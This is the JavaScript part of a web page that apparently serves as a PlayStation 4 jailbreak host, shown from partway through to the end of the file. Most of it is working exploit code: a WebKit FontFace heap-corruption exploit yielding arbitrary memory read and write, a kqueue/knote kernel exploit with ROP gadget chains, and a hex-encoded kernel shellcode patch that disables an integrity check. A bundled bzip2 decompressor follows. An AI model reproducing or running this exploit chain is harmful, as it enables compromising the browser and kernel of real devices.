    kchain2.push(gadgets["mov [rax], rdx"]);
    kchain2.push(gadgets["pop rdi"]);
    var idx6 = kchain2.pushSymbolic();
    kchain2.push(gadgets["mov [rdi], rax"]);
    kchain2.push(gadgets["sti"]);
    kchain2.push(gadgets["pop rsp"]);
    var idx6_dest = kchain2.get_rsp();
    kchain2.pushSymbolic(); // overwritten with old stack pointer
    kchain2.finalizeSymbolic(idx6, idx6_dest);
}

function object_setup() {
    //Map fake object
    var fake_knote = chain.syscall(477, 0x4000, 0x4000 * 0x3, 0x3, 0x1010, 0xFFFFFFFF, 0x0);
    var fake_filtops = fake_knote.add32(0x4000);
    var fake_obj = fake_knote.add32(0x8000);
    if (fake_knote.low != 0x4000) {
        alert("enomem: " + fake_knote);
        while (1);
    }
    //setup fake object
    //KNOTE
    {
        p.write8(fake_knote, fake_obj);
        p.write8(fake_knote.add32(0x68), fake_filtops)
    }
    //FILTOPS
    {
        p.write8(fake_filtops.sub32(0x79), gadgets["cli ; pop rax"]); //cli ; pop rax ; ret
        p.write8(fake_filtops.add32(0x0), gadgets["xchg rdi, rsp ; call [rsi - 0x79]"]); //xchg rdi, rsp ; call qword ptr [rsi - 0x79]
        p.write8(fake_filtops.add32(0x8), kchain.stack);
        p.write8(fake_filtops.add32(0x10), gadgets["mov rcx, [rdi] ; mov rsi, rax ; call [rcx + 0x30]"]); //mov rcx, qword ptr [rdi] ; mov rsi, rax ; call qword ptr [rcx + 0x30]
    }
    //OBJ
    {
        p.write8(fake_obj.add32(0x30), gadgets["mov rdi, [rax + 8] ; call [rax]"]); //mov rdi, qword ptr [rax + 8] ; call qword ptr [rax]
    }
    //Ensure the fake knote remains available
    chain.syscall(203, fake_knote, 0xC000);
}

var trigger_spray = function () {

var NUM_KQUEUES = 0x1B0;
var kqueue_ptr = p.malloc(NUM_KQUEUES * 0x4);
//Make kqueues
{
    for (var i = 0; i < NUM_KQUEUES; i++) {
        chain.fcall(window.syscalls[362]);
        chain.write_result4(kqueue_ptr.add32(0x4 * i));
    }
}
chain.run();
var kqueues = p.array_from_address(kqueue_ptr, NUM_KQUEUES);

var that_one_socket = chain.syscall(97, 2, 1, 0);
if (that_one_socket.low < 0x100 || that_one_socket.low >= 0x200) {
    alert("invalid socket");
    while (1);
}

//Spray kevents
var kevent = p.malloc(0x20);
p.write8(kevent.add32(0x0), that_one_socket);
p.write4(kevent.add32(0x8), 0xFFFF + 0x010000);
p.write4(kevent.add32(0xC), 0x0);
p.write8(kevent.add32(0x10), 0x0);
p.write8(kevent.add32(0x18), 0x0);
//
{
    for (var i = 0; i < NUM_KQUEUES; i++) {
        chain.fcall(window.syscalls[363], kqueues[i], kevent, 0x1, 0x0, 0x0, 0x0);
    }
}
chain.run();

//Fragment memory
{
    for (var i = 18; i < NUM_KQUEUES; i += 2) {
        chain.fcall(window.syscalls[6], kqueues[i]);
    }
}
chain.run();

//Trigger OOB
function exec_oob()
{
//Trigger corrupt knote
for (var i = 1; i < NUM_KQUEUES; i += 2) {
        chain.fcall(window.syscalls[6], kqueues[i]);
    }
    chain.run();

    if (chain.syscall(23, 0).low == 0) 
    {
        disableUSB();
        //cleanup fake knote & release locked gadgets/stack.
        chain.fcall(window.syscalls[73], 0x4000, 0xC000);
        chain.fcall(window.syscalls[325]);
        chain.run();
        
        //This disables sysveri, see https://github.com/ChendoChap/pOOBs4/blob/main/patch.s for more info
        var patch_buffer = chain.syscall(477, 0x0, 0x4000, 0x7, 0x1000, 0xFFFFFFFF, 0);
        var patch_buffer_view = p.array_from_address(patch_buffer, 0x1000);
        var PatchPl = [0x00000BB8,0xFE894800,0x033D8D48,0x0F000000,0x4855C305,0x8B48E589,0x95E8087E,0xE8000000,0x00000175,0x033615FF,0x8B480000,0x0003373D,0x3F8B4800,0x74FF8548,0x3D8D48EB,0x0000029D,0xF9358B48,0x48000002,0x0322158B,0x8B480000,0x00D6E812,0x8D480000,0x00029F3D,0x358B4800,0x000002E4,0x05158B48,0x48000003,0xB9E8128B,0x48000000,0x02633D8D,0x8B480000,0x0002BF35,0x158B4800,0x000002C8,0xE8128B48,0x0000009C,0x7A3D8D48,0x48000002,0x02AA358B,0x8B480000,0x0002AB15,0x128B4800,0x00007FE8,0x0185E800,0xC35D0000,0x6D3D8948,0x48000002,0x026E3D01,0x01480000,0x00026F3D,0x3D014800,0x00000270,0x713D0148,0x48000002,0x02723D01,0x01480000,0x0002933D,0x3D014800,0x00000294,0x653D0148,0x48000002,0x02663D01,0x01480000,0x0002873D,0x3D014800,0x00000288,0x893D0148,0x48000002,0x028A3D01,0x01480000,0x00028B3D,0x3D014800,0x0000024C,0x3D3D0148,0xC3000002,0xE5894855,0x10EC8348,0x24348948,0x24548948,0xED15FF08,0x48000001,0x4B74C085,0x48C28948,0x4840408B,0x2F74C085,0x28788B48,0x243C3B48,0x8B480A74,0xC0854800,0xECEB1D74,0x18788B48,0x74FF8548,0x7F8B48ED,0x7C3B4810,0xE2750824,0xFF1040C7,0x48FFFFFF,0x31107A8D,0x31D231F6,0xA515FFC9,0x48000001,0x5D10C483,0x894855C3,0xC0200FE5,0xFFFF2548,0x220FFFFE,0x3D8B48C0,0x000001C8,0x909007C7,0x47C79090,0x48909004,0x358B48B8,0x000001AC,0x08778948,0x651047C7,0xC73C8B48,0x00251447,0x47C70000,0x89480018,0x1C47C738,0xB8489090,0x7D358B48,0x48000001,0xC7207789,0xC7482847,0x47C70100,0x0000002C,0x778D48E9,0x158B4834,0x00000150,0x89F22948,0x8B483057,0x00016B35,0x568D4800,0xD7294805,0xC148FF89,0x814808E7,0x0000E9CF,0x3E894800,0x00000D48,0x220F0001,0x55C35DC0,0x0FE58948,0x2548C020,0xFFFEFFFF,0x48C0220F,0x013A3D8B,0x07C70000,0x00C3C031,0x353D8B48,0xC7000001,0xC3C03107,0x3D8B4800,0x00000130,0xC03107C7,0x8B4800C3,0x00012B3D,0x3107C700,0x4800C3C0,0x00A63D8B,0x87C70000,0x001F1E01,0x9090F631,0x1E0587C7,0xC931001F,0x87C79090,0x001F1E09,0x9090D231,0x1E3E87C7,0xC931001F,0x0D489090,0x00010000,0xFFC0220F,0x0000EF15,0xC0200F00,0xFFFF2548,0x220FFFFE,0x3D8B48C0,0x000000DC,0xC03107C7,0x0D4800C3,0x00010000,0x5DC0220F,0x737973C3,0x5F6D6574,0x70737573,0x5F646E65,0x73616870,0x705F3265,0x735F6572,0x00636E79,0x74737973,0x725F6D65,0x6D757365,0x68705F65,0x32657361,0x73797300,0x5F6D6574,0x75736572,0x705F656D,0x65736168,0x90900033,0x00000000,0x00000000,0x000F88F0,0x00000000,0x002EF170,0x00000000,0x00018DF0,0x00000000,0x00018EF0,0x00000000,0x02654110,0x00000000,0x00097230,0x00000000,0x00402E60,0x00000000,0x01520108,0x00000000,0x01520100,0x00000000,0x00462D20,0x00000000,0x00462DFC,0x00000000,0x006259A0,0x00000000,0x006268D0,0x00000000,0x00625DC0,0x00000000,0x00626290,0x00000000,0x00626720,0x00000000];
        for(var i=0; i < PatchPl.length; i++)
        {
          patch_buffer_view[i] = PatchPl[i];
        }
        chain.fcall(window.syscalls[203], patch_buffer, 0x4000);
        chain.fcall(patch_buffer, p.read8(KERNEL_BASE_PTR));
        chain.fcall(window.syscalls[73], patch_buffer, 0x4000);
        chain.run();
        //Add to counter
        localStorage.passcount = ++localStorage.passcount;window.passCounter.innerHTML=localStorage.passcount;
    }
    else
    {
        localStorage.failcount = ++localStorage.failcount;window.failCounter.innerHTML=localStorage.failcount;
        disableUSB();
        alert("failed to trigger exploit kernel heap might be corrupted, try again or reboot the console");
        p.write8(0, 0);
    }
}
//EXEC OOB CUSTOM METHOD FOR ESP32-S2
//ESP32 enable usb - stooged
enableUSB();
sleep(usbWaitTime);
exec_oob();
}

/////////////////////////////WEBKIT EXPLOIT
var PAGE_SIZE = 16384;
var SIZEOF_CSS_FONT_FACE = 0xb8;
var HASHMAP_BUCKET = 208;
var STRING_OFFSET = 20;
var SPRAY_FONTS = 0x100a;
var GUESS_FONT = 0x200430000;
var NPAGES = 20;
var INVALID_POINTER = 0;
var HAMMER_FONT_NAME = "font8"; //must take bucket 3 of 8 (counting from zero)
var HAMMER_NSTRINGS = 700; //tweak this if crashing during hammer time

function poc() {
    StartTimer();
    var union = new ArrayBuffer(8);
    var union_b = new Uint8Array(union);
    var union_i = new Uint32Array(union);
    var union_f = new Float64Array(union);

    var bad_fonts = [];

    for (var i = 0; i < SPRAY_FONTS; i++)
        bad_fonts.push(new FontFace("font1", "", {}));

    var good_font = new FontFace("font2", "url(data:text/html,)", {});
    bad_fonts.push(good_font);

    var arrays = [];
    for (var i = 0; i < 512; i++)
        arrays.push(new Array(31));

    arrays[256][0] = 1.5;
    arrays[257][0] = {};
    arrays[258][0] = 1.5;

    var jsvalue = {
        a: arrays[256],
        b: new Uint32Array(1),
        c: true
    };

    var string_atomifier = {};
    var string_id = 10000000;

    function ptrToString(p) {
        var s = '';
        for (var i = 0; i < 8; i++) {
            s += String.fromCharCode(p % 256);
            p = (p - p % 256) / 256;
        }
        return s;
    }

    function stringToPtr(p, o) {
        if (o === undefined)
            o = 0;
        var ans = 0;
        for (var i = 7; i >= 0; i--)
            ans = 256 * ans + p.charCodeAt(o + i);
        return ans;
    }

    var strings = [];

    function mkString(l, head) {
        var s = head + '\u0000'.repeat(l - STRING_OFFSET - 8 - head.length) + (string_id++);
        string_atomifier[s] = 1;
        strings.push(s);
        return s;
    }

    var guf = GUESS_FONT;
    var ite = true;
    var matches = 0;

    var round = 0;

    window.ffses = {};

    do {

        var p_s = ptrToString(NPAGES + 2); // vector.size()
        for (var i = 0; i < NPAGES; i++)
            p_s += ptrToString(guf + i * PAGE_SIZE);
        p_s += ptrToString(INVALID_POINTER);

        for (var i = 0; i < 256; i++)
            mkString(HASHMAP_BUCKET, p_s);

        var ffs = ffses["search_" + (++round)] = new FontFaceSet(bad_fonts);

        var badstr1 = mkString(HASHMAP_BUCKET, p_s);

        var guessed_font = null;
        var guessed_addr = null;

        for (var i = 0; i < SPRAY_FONTS; i++) {
            bad_fonts[i].family = "search" + round;
            if (badstr1.substr(0, p_s.length) != p_s) {
                guessed_font = i;
                var p_s1 = badstr1.substr(0, p_s.length);
                for (var i = 1; i <= NPAGES; i++) {
                    if (p_s1.substr(i * 8, 8) != p_s.substr(i * 8, 8)) {
                        guessed_addr = stringToPtr(p_s.substr(i * 8, 8));
                        break;
                    }
                }
                if (matches++ == 0) {
                    guf = guessed_addr + 2 * PAGE_SIZE;
                    guessed_addr = null;
                }
                break;
            }
        }

        if ((ite = !ite))
            guf += NPAGES * PAGE_SIZE;

    }
    while (guessed_addr === null);

    var p_s = '';
    p_s += ptrToString(26);
    p_s += ptrToString(guessed_addr);
    p_s += ptrToString(guessed_addr + SIZEOF_CSS_FONT_FACE);
    for (var i = 0; i < 19; i++)
        p_s += ptrToString(INVALID_POINTER);

    for (var i = 0; i < 256; i++)
        mkString(HASHMAP_BUCKET, p_s);

    var needfix = [];
    for (var i = 0;; i++) {
        ffses["ffs_leak_" + i] = new FontFaceSet([bad_fonts[guessed_font], bad_fonts[guessed_font + 1], good_font]);
        var badstr2 = mkString(HASHMAP_BUCKET, p_s);
        needfix.push(mkString(HASHMAP_BUCKET, p_s));
        bad_fonts[guessed_font].family = "evil2";
        bad_fonts[guessed_font + 1].family = "evil3";
        var leak = stringToPtr(badstr2.substr(badstr2.length - 8));
        if (leak < 0x1000000000000)
            break;
    }

    function makeReader(read_addr, ffs_name) {
        var fake_s = '';
        fake_s += '0000'; //padding for 8-byte alignment
        fake_s += '\u00ff\u0000\u0000\u0000\u00ff\u00ff\u00ff\u00ff'; //refcount=255, length=0xffffffff
        fake_s += ptrToString(read_addr); //where to read from
        fake_s += ptrToString(0x80000014); //some fake non-zero hash, atom, 8-bit
        p_s = '';
        p_s += ptrToString(29);
        p_s += ptrToString(guessed_addr);
        p_s += ptrToString(guessed_addr + SIZEOF_CSS_FONT_FACE);
        p_s += ptrToString(guessed_addr + 2 * SIZEOF_CSS_FONT_FACE);
        for (var i = 0; i < 18; i++)
            p_s += ptrToString(INVALID_POINTER);
        for (var i = 0; i < 256; i++)
            mkString(HASHMAP_BUCKET, p_s);
        var the_ffs = ffses[ffs_name] = new FontFaceSet([bad_fonts[guessed_font], bad_fonts[guessed_font + 1], bad_fonts[guessed_font + 2], good_font]);
        mkString(HASHMAP_BUCKET, p_s);
        var relative_read = mkString(HASHMAP_BUCKET, fake_s);
        bad_fonts[guessed_font].family = ffs_name + "_evil1";
        bad_fonts[guessed_font + 1].family = ffs_name + "_evil2";
        bad_fonts[guessed_font + 2].family = ffs_name + "_evil3";
        needfix.push(relative_read);
        if (relative_read.length < 1000) //failed
            return makeReader(read_addr, ffs_name + '_');
        return relative_read;
    }

    var fastmalloc = makeReader(leak, 'ffs3'); //read from leaked string ptr

    for (var i = 0; i < 100000; i++)
        mkString(128, '');

    var props = [];
    for (var i = 0; i < 0x10000; i++) {
        props.push({
            value: 0x41434442
        });
        props.push({
            value: jsvalue
        });
    }

    var jsvalue_leak = null;

    while (jsvalue_leak === null) {
        Object.defineProperties({}, props);
        for(var i = fastmalloc.indexOf("\u0042\u0044\u0043\u0041\u0000\u0000\u00fe\u00ff");; i++)
        {
            if (fastmalloc.charCodeAt(i) == 0x42 &&
                fastmalloc.charCodeAt(i + 1) == 0x44 &&
                fastmalloc.charCodeAt(i + 2) == 0x43 &&
                fastmalloc.charCodeAt(i + 3) == 0x41 &&
                fastmalloc.charCodeAt(i + 4) == 0 &&
                fastmalloc.charCodeAt(i + 5) == 0 &&
                fastmalloc.charCodeAt(i + 6) == 254 &&
                fastmalloc.charCodeAt(i + 7) == 255 &&
                fastmalloc.charCodeAt(i + 24) == 14
            ) {
                jsvalue_leak = stringToPtr(fastmalloc, i + 32);
                break;
            }
        }
    }

    var rd_leak = makeReader(jsvalue_leak, 'ffs4');
    var array256 = stringToPtr(rd_leak, 16); //arrays[256]
    var ui32a = stringToPtr(rd_leak, 24); //Uint32Array

    var rd_arr = makeReader(array256, 'ffs5');
    var butterfly = stringToPtr(rd_arr, 8);

    var rd_ui32 = makeReader(ui32a, 'ffs6');
    for (var i = 0; i < 8; i++)
        union_b[i] = rd_ui32.charCodeAt(i);

    var structureid_low = union_i[0];
    var structureid_high = union_i[1];

    //setup for addrof/fakeobj
    //in array[256] butterfly: 0 = &bad_fonts[guessed_font+12] as double
    //in array[257] butterfly: 0 = {0x10000, 0x10000} as jsvalue
    union_i[0] = 0x10000;
    union_i[1] = 0; //account for nan-boxing
    arrays[257][1] = {}; //force it to still be jsvalue-array not double-array
    arrays[257][0] = union_f[0];
    union_i[0] = (guessed_addr + 12 * SIZEOF_CSS_FONT_FACE) | 0;
    union_i[1] = (guessed_addr - guessed_addr % 0x100000000) / 0x100000000;
    arrays[256][i] = union_f[0];

    //hammer time!

    pp_s = '';
    pp_s += ptrToString(56);
    for (var i = 0; i < 12; i++)
        pp_s += ptrToString(guessed_addr + i * SIZEOF_CSS_FONT_FACE);

    var fake_s = '';
    fake_s += '0000'; //padding for 8-byte alignment
    fake_s += ptrToString(INVALID_POINTER); //never dereferenced
    fake_s += ptrToString(butterfly); //hammer target
    fake_s += '\u0000\u0000\u0000\u0000\u0022\u0000\u0000\u0000'; //length=34

    var ffs7_args = [];
    for (var i = 0; i < 12; i++)
        ffs7_args.push(bad_fonts[guessed_font + i]);
    ffs7_args.push(good_font);

    var ffs8_args = [bad_fonts[guessed_font + 12]];
    for (var i = 0; i < 5; i++)
        ffs8_args.push(new FontFace(HAMMER_FONT_NAME, "url(data:text/html,)", {}));

    for (var i = 0; i < HAMMER_NSTRINGS; i++)
        mkString(HASHMAP_BUCKET, pp_s);

    ffses.ffs7 = new FontFaceSet(ffs7_args);
    mkString(HASHMAP_BUCKET, pp_s);
    ffses.ffs8 = new FontFaceSet(ffs8_args);
    var post_ffs = mkString(HASHMAP_BUCKET, fake_s);
    needfix.push(post_ffs);

    for (var i = 0; i < 13; i++)
        bad_fonts[guessed_font + i].family = "hammer" + i;

    function boot_addrof(obj) {
        arrays[257][32] = obj;
        union_f[0] = arrays[258][0];
        return union_i[1] * 0x100000000 + union_i[0];
    }

    function boot_fakeobj(addr) {
        union_i[0] = addr;
        union_i[1] = (addr - addr % 0x100000000) / 0x100000000;
        arrays[258][0] = union_f[0];
        return arrays[257][32];
    }

    //craft misaligned typedarray

    var arw_master = new Uint32Array(8);
    var arw_slave = new Uint8Array(1);
    var obj_master = new Uint32Array(8);
    var obj_slave = {
        obj: null
    };

    var addrof_slave = boot_addrof(arw_slave);
    var addrof_obj_slave = boot_addrof(obj_slave);
    union_i[0] = structureid_low;
    union_i[1] = structureid_high;
    union_b[6] = 7;
    var obj = {
        jscell: union_f[0],
        butterfly: true,
        buffer: arw_master,
        size: 0x5678
    };

    function i48_put(x, a) {
        a[4] = x | 0;
        a[5] = (x / 4294967296) | 0;
    }

    function i48_get(a) {
        return a[4] + a[5] * 4294967296;
    }

    window.addrof = function (x) {
        obj_slave.obj = x;
        return i48_get(obj_master);
    }

    window.fakeobj = function (x) {
        i48_put(x, obj_master);
        return obj_slave.obj;
    }

    function read_mem_setup(p, sz) {
        i48_put(p, arw_master);
        arw_master[6] = sz;
    }

    window.read_mem = function (p, sz) {
        read_mem_setup(p, sz);
        var arr = [];
        for (var i = 0; i < sz; i++)
            arr.push(arw_slave[i]);
        return arr;
    };

    window.write_mem = function (p, data) {
        read_mem_setup(p, data.length);
        for (var i = 0; i < data.length; i++)
            arw_slave[i] = data[i];
    };

    window.read_ptr_at = function (p) {
        var ans = 0;
        var d = read_mem(p, 8);
        for (var i = 7; i >= 0; i--)
            ans = 256 * ans + d[i];
        return ans;
    };

    window.write_ptr_at = function (p, d) {
        var arr = [];
        for (var i = 0; i < 8; i++) {
            arr.push(d & 0xff);
            d /= 256;
        }
        write_mem(p, arr);
    };

    (function () {
        var magic = boot_fakeobj(boot_addrof(obj) + 16);
        magic[4] = addrof_slave;
        magic[5] = (addrof_slave - addrof_slave % 0x100000000) / 0x100000000;
        obj.buffer = obj_master;
        magic[4] = addrof_obj_slave;
        magic[5] = (addrof_obj_slave - addrof_obj_slave % 0x100000000) / 0x100000000;
        magic = null;
    })();

    //fix fucked objects to stabilize webkit

    (function () {
        //fix fontfaceset (memmoved 96 bytes to low, move back)
        var ffs_addr = read_ptr_at(addrof(post_ffs) + 8) - 208;
        write_mem(ffs_addr, read_mem(ffs_addr - 96, 208));
        //fix strings (restore "valid") header
        for (var i = 0; i < needfix.length; i++) {
            var addr = read_ptr_at(addrof(needfix[i]) + 8);
            write_ptr_at(addr, (HASHMAP_BUCKET - 20) * 0x100000000 + 1);
            write_ptr_at(addr + 8, addr + 20);
            write_ptr_at(addr + 16, 0x80000014);
        }
        //fix array butterfly
        write_ptr_at(butterfly + 248, 0x1f0000001f);
    })();

    //^ @sleirs' stuff. anything pre arb rw is magic, I'm happy I don't have to deal with that.

    //create compat stuff for kexploit.js
    var expl_master = new Uint32Array(8);
    var expl_slave = new Uint32Array(2);
    var addrof_expl_slave = addrof(expl_slave);
    var m = fakeobj(addrof(obj) + 16);
    obj.buffer = expl_slave;
    m[7] = 1;
    obj.buffer = expl_master;
    m[4] = addrof_expl_slave;
    m[5] = (addrof_expl_slave - addrof_expl_slave % 0x100000000) / 0x100000000;
    m[7] = 1;

    var prim = {
        write8: function (addr, value) {
            expl_master[4] = addr.low;
            expl_master[5] = addr.hi;
            if (value instanceof int64) {
                expl_slave[0] = value.low;
                expl_slave[1] = value.hi;
            } else {
                expl_slave[0] = value;
                expl_slave[1] = 0;
            }
        },
        write4: function (addr, value) {
            expl_master[4] = addr.low;
            expl_master[5] = addr.hi;
            if (value instanceof int64) {
                expl_slave[0] = value.low;
            } else {
                expl_slave[0] = value;
            }
        },
        write2: function (addr, value) {
            expl_master[4] = addr.low;
            expl_master[5] = addr.hi;
            var tmp = expl_slave[0] & 0xFFFF0000;
            if (value instanceof int64) {
                expl_slave[0] = ((value.low & 0xFFFF) | tmp);
            } else {
                expl_slave[0] = ((value & 0xFFFF) | tmp);
            }
        },
        write1: function (addr, value) {
            expl_master[4] = addr.low;
            expl_master[5] = addr.hi;
            var tmp = expl_slave[0] & 0xFFFFFF00;
            if (value instanceof int64) {
                expl_slave[0] = ((value.low & 0xFF) | tmp);
            } else {
                expl_slave[0] = ((value & 0xFF) | tmp);
            }
        },
        read8: function (addr) {
            expl_master[4] = addr.low;
            expl_master[5] = addr.hi;
            return new int64(expl_slave[0], expl_slave[1]);
        },
        read4: function (addr) {
            expl_master[4] = addr.low;
            expl_master[5] = addr.hi;
            return expl_slave[0];
        },
        read2: function (addr) {
            expl_master[4] = addr.low;
            expl_master[5] = addr.hi;
            return expl_slave[0] & 0xFFFF;
        },
        read1: function (addr) {
            expl_master[4] = addr.low;
            expl_master[5] = addr.hi;
            return expl_slave[0] & 0xFF;
        },
        leakval: function (obj) {
            obj_slave.obj = obj;
            return new int64(obj_master[4], obj_master[5]);
        }
    };
    
    window.p = prim;
    EndTimer();
    run_hax();
}

function CalcTime(dur){hrs=Math.floor(dur/1000/60/60);min=Math.floor(dur/1000/60-hrs*60);sec=Math.floor(dur/1000-min*60);mil=dur.toString().slice(-3);if (min!=0){ShowDuration=" - WK Exploited In : "+min+" minute"+(min==1?"":"s")+", "+sec+" second"+(sec==1?"":"s");}else {ShowDuration=" - WK Exploited In: "+sec+" second"+(sec==1?"":"s");}}
function StartTimer(){StartTime=Date.now();}
function EndTimer(){EndTime=Date.now();CalcTime(EndTime=Date.now()-StartTime);document.title+=ShowDuration;}


//MODDED BY HIPPIE BZIP2.JS
var bzip2 = {};

bzip2.array = function(bytes) {
  var bit = 0, byte = 0;
  var BITMASK = [0, 0x01, 0x03, 0x07, 0x0F, 0x1F, 0x3F, 0x7F, 0xFF];
  return function(n) {
    var result = 0;
    while (n > 0) {
      var left = 8 - bit;
      if (n >= left) {
        result <<= left;
        result |= (BITMASK[left] & bytes[byte++]);
        bit = 0;
        n -= left;
      } else {
        result <<= n;
        result |= ((bytes[byte] & (BITMASK[n] << (8 - n - bit))) >> (8 - n - bit));
        bit += n;
        n = 0;
      }
    }
    return result;
  }
};

bzip2.simple = function(bits) {
  var size = bzip2.header(bits);
  var all = [], chunk = [];
  do {
    all = all.concat(chunk);
    chunk = bzip2.decompress(bits, size);
  } while (chunk != -1);
  return Uint8Array.from(all);
};

bzip2.header = function(bits) {
  if (bits(8 * 3) != 4348520) throw "No magic number found.";
  var i = bits(8) - 48;
  if (i < 1 || i > 9) throw "Not a bzip2 archive.";
  return i;
};

// Param1: a function for reading the block data (starting with 0x314159265359)
// Param2: block size (0-9) (optional, defaults to 9)
// Param3: length at which to stop decompressing and return the output
bzip2.decompress = function(bits, size, len) {
  var MAX_HUFCODE_BITS = 20;
  var MAX_SYMBOLS = 258;
  var SYMBOL_RUNA = 0;
  var SYMBOL_RUNB = 1;
  var GROUP_SIZE = 50;

  var bufsize = 100000 * size;
  for (var h = "", i = 0; i < 6; i++) h += bits(8).toString(16);
  if (h == "177245385090") return -1; // Last block
  if (h != "314159265359") throw "Not valid bzip2 data.";
  bits(32); // Ignore CRC codes
  if (bits(1)) throw "Unsupported obsolete version.";
  var origPtr = bits(24);
  if(origPtr > bufsize) throw "Initial position larger than buffer size.";
  var t = bits(16);
  var symToByte = new Uint8Array(256),
      symTotal = 0;
  for (i = 0; i < 16; i++) {
    if (t & (1 << (15 - i))) {
      var k = bits(16);
      for (j = 0; j < 16; j++) {
        if (k & (1 << (15 - j))) {
          symToByte[symTotal++] = (16 * i) + j;
        }
      }
    }
  }

  var groupCount = bits(3);
  if (groupCount < 2 || groupCount > 6) throw "Error 1 while decompressing.";
  var nSelectors = bits(15);
  if (nSelectors == 0) throw "Error 2 while decompressing.";
  var mtfSymbol = []; // TODO: possibly replace JS array with typed arrays
  for (var i = 0; i < groupCount; i++) mtfSymbol[i] = i;
  var selectors = new Uint8Array(32768);

  for (var i = 0; i < nSelectors; i++) {
    for (var j = 0; bits(1); j++) if (j >= groupCount) throw "Error 3 while decompressing.";
    var uc = mtfSymbol[j];
    mtfSymbol.splice(j, 1); // This is a probably inefficient MTF transform
    mtfSymbol.splice(0, 0, uc);
    selectors[i] = uc;
  }

  var symCount = symTotal + 2;
  var groups = [];
  for (var j = 0; j < groupCount; j++) {
    var length = new Uint8Array(MAX_SYMBOLS),
        temp = new Uint8Array(MAX_HUFCODE_BITS + 1);
    t = bits(5); // Lengths
    for (var i = 0; i < symCount; i++) {
      while (true) {
        if (t < 1 || t > MAX_HUFCODE_BITS) throw "Error 4 while decompressing.";
        if (!bits(1)) break;
        if (!bits(1)) t++;
        else t--;
      }
      length[i] = t;
    }
    var  minLen,  maxLen;
    minLen = maxLen = length[0];
    for (var i = 1; i < symCount; i++) {
      if (length[i] > maxLen) maxLen = length[i];
      else if (length[i] < minLen) minLen = length[i];
    }
    var hufGroup;
    hufGroup = groups[j] = {};
    hufGroup.permute = new Uint32Array(MAX_SYMBOLS);
    hufGroup.limit = new Uint32Array(MAX_HUFCODE_BITS + 1);
    hufGroup.base = new Uint32Array(MAX_HUFCODE_BITS + 1);
    hufGroup.minLen = minLen;
    hufGroup.maxLen = maxLen;
    var base = hufGroup.base.subarray(1);
    var limit = hufGroup.limit.subarray(1);
    var pp = 0;
    for (var i = minLen; i <= maxLen; i++)
      for (var t = 0; t < symCount; t++)
      if (length[t] == i) hufGroup.permute[pp++] = t;
      for (i = minLen; i <= maxLen; i++) temp[i] = limit[i] = 0;
      for (i = 0; i < symCount; i++) temp[length[i]]++;
      pp = t = 0;
      for (i = minLen; i < maxLen; i++) {
        pp += temp[i];
        limit[i] = pp - 1;
        pp <<= 1;
        base[i + 1] = pp - (t += temp[i]);
      }
      limit[maxLen] = pp + temp[maxLen] - 1;
      base[minLen] = 0;
  }
  var byteCount = new Uint32Array(256);
  for (var i = 0; i < 256; i++) mtfSymbol[i] = i;
  var runPos, count, symCount, selector;
  runPos = count = symCount = selector = 0;
  var buf = new Uint32Array(bufsize);
  while (true) {
    if (!(symCount--)) {
      symCount = GROUP_SIZE - 1;
      if (selector >= nSelectors) throw "Error 5 while decompressing.";
      hufGroup = groups[selectors[selector++]];
      base = hufGroup.base.subarray(1);
      limit = hufGroup.limit.subarray(1);
    }
    i = hufGroup.minLen;
    j = bits(i);
    while (true) {
      if (i > hufGroup.maxLen) throw "Error 6 while decompressing.";
      if (j <= limit[i]) break;
      i++;
      j = (j << 1) | bits(1);
    }
    j -= base[i];
    if (j < 0 || j >= MAX_SYMBOLS) throw "Error 7 while decompressing.";
    var nextSym = hufGroup.permute[j];
    if (nextSym == SYMBOL_RUNA || nextSym == SYMBOL_RUNB) {
      if (!runPos) {
        runPos = 1;
        t = 0;
      }
      if (nextSym == SYMBOL_RUNA) t += runPos;
      else t += 2 * runPos;
      runPos <<= 1;
      continue;
    }
    if (runPos) {
      runPos = 0;
      if (count + t >= bufsize) throw "Error 8 while decompressing.";
      uc = symToByte[mtfSymbol[0]];
      byteCount[uc] += t;
      while (t--) buf[count++] = uc;
    }
    if (nextSym > symTotal) break;
    if (count >= bufsize) throw "Error 9 while decompressing.";
    i = nextSym -1;
    uc = mtfSymbol[i];
    mtfSymbol.splice(i, 1);
    mtfSymbol.splice(0, 0, uc);
    uc = symToByte[uc];
    byteCount[uc]++;
    buf[count++] = uc;
  }
  if (origPtr < 0 || origPtr >= count) throw "Error 10 while decompressing.";
  var j = 0;
  for (var i = 0; i < 256; i++) {
    k = j + byteCount[i];
    byteCount[i] = j;
    j = k;
  }
  for (var i = 0; i < count; i++) {
    uc = buf[i] & 0xff;
    buf[byteCount[uc]] |= (i << 8);
    byteCount[uc]++;
  }
  var pos = 0, current = 0, run = 0;
  if (count) {
    pos = buf[origPtr];
    current = (pos & 0xff);
    pos >>= 8;
    run = -1;
  }
  count = count;
  var output = [];
  var copies, previous, outbyte;
  if (!len) len = Infinity;
  while (count) {
    count--;
    previous = current;
    pos = buf[pos];
    current = pos & 0xff;
    pos >>= 8;
    if (run++ == 3) {
      copies = current;
      outbyte = previous;
      current = -1;
    } else {
      copies = 1;
      outbyte = current;
    }
    while (copies--) {
      output.push(outbyte);
      if (!--len) return output;
    }
    if (current != previous) run = 0;
  }
  return output;
};

</script>

    
</body>
</html>
